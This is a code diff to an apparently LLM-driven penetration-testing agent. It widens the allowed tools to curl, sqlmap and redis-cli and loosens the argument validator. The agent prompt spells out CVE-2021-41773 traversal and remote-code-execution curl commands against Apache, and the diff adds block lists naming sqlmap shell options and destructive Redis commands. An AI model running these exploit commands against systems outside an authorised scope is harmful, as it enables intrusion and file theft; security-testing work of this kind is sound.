@@ -31,17 +31,24 @@ def _get_client() -> OpenAI:
     return _client
 
 
-# Tools the executor can actually run today vs. ones queued for Phase 3
-KNOWN_TOOLS = {"nmap", "gobuster", "nikto"}
-PHASE3_TOOLS = {"sqlmap", "hydra", "wpscan", "commix", "metasploit"}
+# Tools the executor can actually run (Phase 3 added curl/sqlmap/redis-cli)
+KNOWN_TOOLS = {"nmap", "gobuster", "nikto", "curl", "sqlmap", "redis-cli"}
 
 # args that write/read files or otherwise escape the intended scan
 BLOCKED_NMAP_ARGS = {"-oN", "-oX", "-oG", "-oA", "-oS", "-iL", "--datadir",
                      "--excludefile", "--append-output", "--stylesheet"}
-MAX_ARGS = 12
+BLOCKED_CURL_FLAGS = {"-o", "-O", "--output", "-T", "--upload-file", "-K",
+                      "--config", "-F"}
+BLOCKED_SQLMAP_FLAGS = {"--os-shell", "--os-pwn", "--sql-shell",
+                        "--file-write", "--file-dest"}
+BLOCKED_REDIS_COMMANDS = {"FLUSHALL", "FLUSHDB", "SHUTDOWN", "DEBUG",
+                          "SLAVEOF", "REPLICAOF"}
+MAX_ARGS = 20
 
-# one CLI token: no shell metacharacters, no spaces, no quotes
-SAFE_ARG = re.compile(r"^[A-Za-z0-9_.,:/@=+\-*]{1,64}$")
+# one CLI token: any printable characters (URLs carry ? & % [ ]; POST payloads
+# carry spaces/semicolons inside one quoted token). No shell ever runs this —
+# runner.py uses an argv list — so the real risk is file I/O, handled above.
+SAFE_ARG = re.compile(r"^[^\x00-\x1f]{1,200}$")
 
 RISK_LEVELS = ("passive", "active", "exploit")
 
@@ -54,12 +61,33 @@ target.
 Decide the single best next action. Chains are good — build on what history
 shows succeeded or failed — but propose exactly ONE command.
 
+Available binaries (the first token must be exactly one of these):
+- nmap, gobuster, nikto — reconnaissance
+- curl — fetch a URL/file or send an HTTP request. Use --path-as-is for
+  traversal paths. CVE-2021-41773 (Apache 2.4.49) PoC shapes:
+  curl -s --path-as-is 'http://host:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+  curl -s --path-as-is -X POST --data 'echo Content-Type: text/plain; echo; id' \
+    'http://host:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
+- sqlmap — SQL injection testing. Example:
+  sqlmap -u 'http://host:8081/vulnerabilities/sqli/?id=1' --batch
+- redis-cli — Redis interaction. Always pass -h <target> -p <port>. Example:
+  redis-cli -h 127.0.0.1 -p 6379 INFO
+
+Choosing the tool:
+- finding says a file/path is accessible (php.ini, robots.txt, .htpasswd,
+  /etc/passwd...): use curl to fetch it — NEVER nikto on a file URL.
+- service banner has a known CVE (e.g. Apache 2.4.49 / CVE-2021-41773):
+  propose the direct PoC with curl (traversal first; RCE via the cgi-bin
+  path with a POST payload only after traversal is confirmed).
+- open Redis without auth: use redis-cli (PING, INFO, CONFIG GET dir, KEYS *).
+- parameterized URL/endpoint: consider sqlmap.
+- do not repeat an action history already shows ran — unless it failed only
+  because the port/URL was wrong; then fix the port and retry.
+
 risk_level classification:
-- "passive": enumeration of the kind the recon phase already does
-  (deeper nmap version/port scans, bigger gobuster wordlists, nikto).
-- "active": probing beyond passive recon that is not yet exploitation.
-- "exploit": exploitation-class tools (sqlmap/hydra/wpscan/commix) or any
-  payload delivery. These are gated behind environment: lab.
+- "passive": enumeration (nmap/gobuster/nikto, read-only GET of a public file)
+- "active": probing beyond recon (traversal read, redis INFO/CONFIG GET)
+- "exploit": payload delivery / RCE / sqlmap / state-changing redis commands
 
 Respond ONLY with valid JSON:
 {
@@ -71,13 +99,11 @@ Respond ONLY with valid JSON:
 }
 
 Hard rules for exact_tool_and_command:
-- binary must be one of: nmap, gobuster, nikto, sqlmap, hydra, wpscan, commix
 - write the target literally as given in the input — never a placeholder
 - if the findings reference a non-standard web port, use that exact URL in the
   command (e.g. http://host:8081) — never silently assume port 80
 - no shell chaining: no ; | && || backticks sudo
-- no file input/output arguments
-- do not repeat an action that history already shows ran
+- no file input/output arguments (-o, -O, -T, @file, --config)
 - if nothing sensible is possible, propose the best passive verification"""
 
 
@@ -164,8 +190,9 @@ def parse_reasoner_output(raw: str) -> ReasonerOutput:
 
 def validate_action(command: str, target: str) -> dict | None:
     """
-    Safety boundary for ONE proposed command. Fail-closed: any bad token
-    rejects the whole action. Returns {"tool", "args", "command"} or None.
+    Safety boundary for ONE proposed command. Fail-closed on unknown tools,
+    file I/O flags, destructive redis commands and target mismatch.
+    Returns {"tool", "args", "command"} or None.
     """
     try:
         tokens = shlex.split(command or "")
@@ -174,7 +201,7 @@ def validate_action(command: str, target: str) -> dict | None:
     if not tokens:
         return None
     tool = Path(tokens[0]).name.lower()
-    if tool not in KNOWN_TOOLS | PHASE3_TOOLS:
+    if tool not in KNOWN_TOOLS:
         return None
     args = tokens[1:]
     if not args or len(args) > MAX_ARGS:
@@ -186,7 +213,15 @@ def validate_action(command: str, target: str) -> dict | None:
                                or a.startswith("--datadir")
                                or a.startswith("--excludefile")):
             return None
+        if tool == "curl" and (a in BLOCKED_CURL_FLAGS or a.startswith("@")):
+            return None
+        if tool == "sqlmap" and a in BLOCKED_SQLMAP_FLAGS:
+            return None
+        if tool == "redis-cli" and a.upper() in BLOCKED_REDIS_COMMANDS:
+            return None
     # the command must actually aim at the scoped target
     if not any(target.lower() in a.lower() for a in args):
+        return None
+    if tool == "sqlmap" and not ({"-u", "--url"} & set(args)):
         return None
     return {"tool": tool, "args": args, "command": command.strip()}
